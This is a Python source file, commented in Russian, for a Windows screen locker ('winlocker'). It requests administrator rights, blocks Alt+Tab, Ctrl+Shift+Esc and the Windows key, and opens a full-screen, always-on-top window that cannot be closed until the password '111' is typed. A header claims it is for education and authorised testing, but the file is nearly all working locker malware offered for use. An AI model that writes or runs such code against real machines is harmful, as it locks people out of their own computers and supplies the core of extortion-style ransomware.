# Винлокер для Windows: Блокирует экран до ввода пароля "111"
# Разработано для образовательных целей и авторизованного тестирования в контролируемой среде
# Использование в несанкционированных системах строго запрещено

import tkinter as tk
from tkinter import messagebox
import ctypes
import os
import logging
import sys
import keyboard
import win32gui
import win32con
import pywintypes

# Настройка логирования для отслеживания действий
logging.basicConfig(filename='winlocker.log', level=logging.INFO, 
                   format='%(asctime)s - %(levelname)s - %(message)s')

# Пароль для разблокировки
CORRECT_PASSWORD = "111"

# Функция для проверки, запущена ли программа с правами администратора
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Функция для запроса прав администратора
def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

# Функция для блокировки системных комбинаций клавиш (Alt+Tab, Ctrl+Alt+Del, etc.)
def block_system_keys():
    keyboard.block_key('alt+tab')
    keyboard.block_key('ctrl+esc')
    keyboard.block_key('ctrl+shift+esc')
    keyboard.block_key('win')
    logging.info("Системные комбинации клавиш заблокированы")

# Функция для проверки пароля
def check_password(entry, root):
    user_input = entry.get()
    if user_input == CORRECT_PASSWORD:
        logging.info("Правильный пароль введен, разблокировка")
        root.destroy()  # Закрываем окно
        keyboard.unblock_all()  # Разблокируем клавиши
        sys.exit()
    else:
        logging.warning(f"Неправильный пароль: {user_input}")
        messagebox.showerror("Ошибка", "Неверный пароль! Попробуйте снова.")

# Функция для создания полноэкранного окна блокировки
def create_lock_screen():
    root = tk.Tk()
    root.attributes('-fullscreen', True)  # Полноэкранный режим
    root.attributes('-topmost', True)  # Окно всегда поверх других
    root.configure(bg='black')  # Черный фон для пугающего эффекта

    # Блокируем возможность закрытия окна
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Создаем метку с текстом
    label = tk.Label(root, text="Система заблокирована!\nВведите пароль для разблокировки", 
                    font=("Arial", 24), fg="red", bg="black")
    label.pack(pady=100)

    # Поле ввода пароля
    entry = tk.Entry(root, show="*", font=("Arial", 18))
    entry.pack(pady=20)

    # Кнопка для проверки пароля
    button = tk.Button(root, text="Разблокировать", font=("Arial", 18),
                      command=lambda: check_password(entry, root))
    button.pack(pady=20)

    # Привязываем Enter к проверке пароля
    entry.bind("<Return>", lambda event: check_password(entry, root))

    # Делаем окно неподвижным
    root.resizable(False, False)

    # Устанавливаем окно как активное
    try:
        hwnd = win32gui.GetForegroundWindow()
        win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
                             win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
    except pywintypes.error as e:
        logging.error(f"Ошибка при установке окна: {e}")

    return root

# Основная функция
def main():
    # Запрашиваем права администратора
    run_as_admin()

    # Логируем запуск программы
    logging.info("Винлокер запущен")

    # Блокируем системные клавиши
    block_system_keys()

    # Создаем и запускаем окно блокировки
    root = create_lock_screen()
    root.mainloop()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.error(f"Критическая ошибка: {e}")
        sys.exit(1)